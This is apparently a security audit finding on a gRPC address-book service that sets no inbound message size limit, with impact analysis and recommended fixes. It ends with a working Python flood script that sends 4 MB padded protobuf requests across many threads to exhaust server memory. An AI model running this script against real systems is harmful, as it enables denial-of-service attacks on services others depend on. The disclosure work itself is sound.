### Title
Missing `maxInboundMessageSize` Limit on gRPC Server Allows Pre-Validation Memory Exhaustion via Oversized `AddressBookQuery`

### Summary
The gRPC server's `ServerBuilderCustomizer` in `GrpcConfiguration` never calls `serverBuilder.maxInboundMessageSize(...)`, leaving the server at gRPC-Java's default 4 MB inbound limit. The `AddressBookQuery` message is semantically a ~20-byte message (one `FileID` + one `int32`), yet any unauthenticated caller can send up to 4 MB of protobuf-encoded data (e.g., as unknown fields) that is fully buffered and deserialized by the framework before `getNodes()` is ever invoked. Combined with no connection-level rate limiting, this enables a low-cost memory and CPU exhaustion attack.

### Finding Description

**Proto definition** — `AddressBookQuery` has exactly two fields: a `FileID` (three varint integers) and an `int32 limit`. A legitimate request is ≤ 30 bytes.

**Server configuration gap** — `GrpcConfiguration.grpcServerConfigurer()` (lines 27–35) customises the Netty server with only two settings:

```java
serverBuilder.executor(applicationTaskExecutor);
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection()); // default 5
```

`serverBuilder.maxInboundMessageSize(...)` is never called. gRPC-Java's hard default is **4 194 304 bytes (4 MB)**. The framework enforces this limit at the transport layer, but it fully buffers and deserialises the entire payload before dispatching to the service method.

**Controller entry point** — `NetworkController.getNodes()` (lines 33–43) receives an already-deserialised `AddressBookQuery request`. All field validation (`fileId`, `limit`) happens inside `Mono.fromCallable(() -> toFilter(request))` — i.e., strictly *after* the 4 MB payload has been allocated in heap memory.

**Exploit flow:**
1. Attacker opens many TCP connections to port 5600 (no authentication, no TLS required by default).
2. Each connection sends up to 5 concurrent `getNodes` calls (the per-connection cap), each carrying a 4 MB `AddressBookQuery` padded with unknown protobuf fields.
3. The gRPC Netty layer buffers each 4 MB message, allocates a `ByteString`/`byte[]` for it, and runs protobuf deserialisation — all before `getNodes()` is called.
4. Validation in `NetworkServiceImpl.getNodes()` (fileId check, limit check) is irrelevant; the memory has already been allocated and the CPU has already been spent.
5. With N connections × 5 calls × 4 MB = 20N MB of simultaneous heap pressure, the JVM can be driven into GC thrashing or OOM.

### Impact Explanation
An unauthenticated remote attacker can cause the gRPC service to allocate up to 4 MB of heap per in-flight request before any application logic runs. With no connection rate limit and no IP-based throttling visible in the codebase, an attacker with modest bandwidth can sustain enough concurrent requests to exhaust JVM heap, trigger full GC pauses, or crash the process — denying address-book service to all legitimate clients. Severity: **Medium–High** (unauthenticated DoS, no data exfiltration).

### Likelihood Explanation
The endpoint is publicly reachable (port 5600, no auth). The attack requires only a standard gRPC client library and the ability to craft a protobuf message with a large unknown-field blob. It is trivially scriptable, repeatable, and requires no special privileges. The only natural friction is the 4 MB per-message cap and the 5-calls-per-connection limit, both of which are easily saturated with multiple connections.

### Recommendation
1. **Set a tight `maxInboundMessageSize`** in `GrpcConfiguration.grpcServerConfigurer()`:
   ```java
   serverBuilder.maxInboundMessageSize(4096); // AddressBookQuery needs < 30 bytes; 4 KB is generous
   ```
2. **Expose `maxInboundMessageSize` as a configurable property** in `NettyProperties` alongside `maxConcurrentCallsPerConnection`.
3. **Add connection-level rate limiting** (e.g., `maxConnectionsPerIp`) or place an L7 proxy (Envoy/nginx) in front that enforces per-IP request rates.
4. **Add a `maxConnections` limit** via `serverBuilder.maxConnectionIdle(...)` / `serverBuilder.maxConnectionAge(...)` to bound total concurrent connections.

### Proof of Concept

```python
import grpc
from google.protobuf import descriptor_pb2

# Build a ~4 MB AddressBookQuery by stuffing unknown field tag 15 (wire type 2 = length-delimited)
# Field 15 is unknown to AddressBookQuery; protobuf will buffer it as an unknown field.
FIELD_TAG = (15 << 3) | 2   # field 15, wire type 2
payload   = b'\x00' * (4 * 1024 * 1024 - 16)

import struct
def encode_varint(v):
    buf = []
    while v > 0x7F:
        buf.append((v & 0x7F) | 0x80)
        v >>= 7
    buf.append(v)
    return bytes(buf)

raw = encode_varint(FIELD_TAG) + encode_varint(len(payload)) + payload

channel = grpc.insecure_channel('mirror-node-grpc:5600')

# Send raw bytes as the serialised AddressBookQuery
# Repeat across many connections to exhaust heap
import threading

def flood():
    for _ in range(100):
        try:
            channel.unary_stream(
                '/com.hedera.mirror.api.proto.NetworkService/getNodes',
                request_serializer=lambda _: raw,
                response_deserializer=lambda b: b,
            )(b'', metadata=[])
        except Exception:
            pass

threads = [threading.Thread(target=flood) for _ in range(50)]
for t in threads: t.start()
for t in threads: t.join()
```

Each call forces the server to buffer and deserialise up to 4 MB before `getNodes()` is reached. Running 50 threads × 100 calls saturates the server's heap with pre-validation allocations.
